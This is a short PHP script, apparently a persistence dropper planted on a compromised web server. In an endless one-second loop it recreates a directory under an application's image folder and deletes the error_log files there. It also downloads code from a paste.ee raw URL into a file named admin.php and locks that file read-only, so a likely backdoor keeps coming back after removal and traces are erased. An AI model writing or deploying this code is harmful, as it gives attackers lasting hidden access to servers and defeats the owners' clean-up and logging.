<?php

$DIR_PATH = "/home/apps/antrian/image";
$FILE_NAME = "admin.php";
$DOWNLOAD_URL = "https://paste.ee/r/pKCHx";
$DEFAULT_DIR_PERMISSIONS = "755";
$DEFAULT_FILE_PERMISSIONS = "444";

function create_directory($path) {
    if (!is_dir($path)) {
        mkdir($path, octdec($GLOBALS['DEFAULT_DIR_PERMISSIONS']), true);
    }
}

function download_file($filePath, $url) {
    $contents = file_get_contents($url);
    if ($contents !== false) {
        file_put_contents($filePath, $contents);
        chmod($filePath, octdec($GLOBALS['DEFAULT_FILE_PERMISSIONS']));
    }
}

function check_directory_and_file() {
    create_directory($GLOBALS['DIR_PATH']);
    chdir($GLOBALS['DIR_PATH']);
    
    if (file_exists("error_log")) {
        unlink("error_log");
    }
    if (file_exists("error.log")) {
        unlink("error.log");
    }
    
    download_file($GLOBALS['FILE_NAME'], $GLOBALS['DOWNLOAD_URL']);
}

function update_permissions() {
    $dirPermissions = substr(sprintf('%o', fileperms($GLOBALS['DIR_PATH'])), -4);
    if ($dirPermissions !== $GLOBALS['DEFAULT_DIR_PERMISSIONS']) {
        chmod($GLOBALS['DIR_PATH'], octdec($GLOBALS['DEFAULT_DIR_PERMISSIONS']));
    }
    
    $filePath = $GLOBALS['DIR_PATH'] . '/' . $GLOBALS['FILE_NAME'];
    $filePermissions = substr(sprintf('%o', fileperms($filePath)), -4);
    if ($filePermissions !== $GLOBALS['DEFAULT_FILE_PERMISSIONS']) {
        chmod($filePath, octdec($GLOBALS['DEFAULT_FILE_PERMISSIONS']));
    }
}

while (true) {
    check_directory_and_file();
    update_permissions();

    $filePath = $DIR_PATH . '/' . $FILE_NAME;
    if (filesize($filePath) === 0) {
        unlink($filePath);
    }

    sleep(1);
}
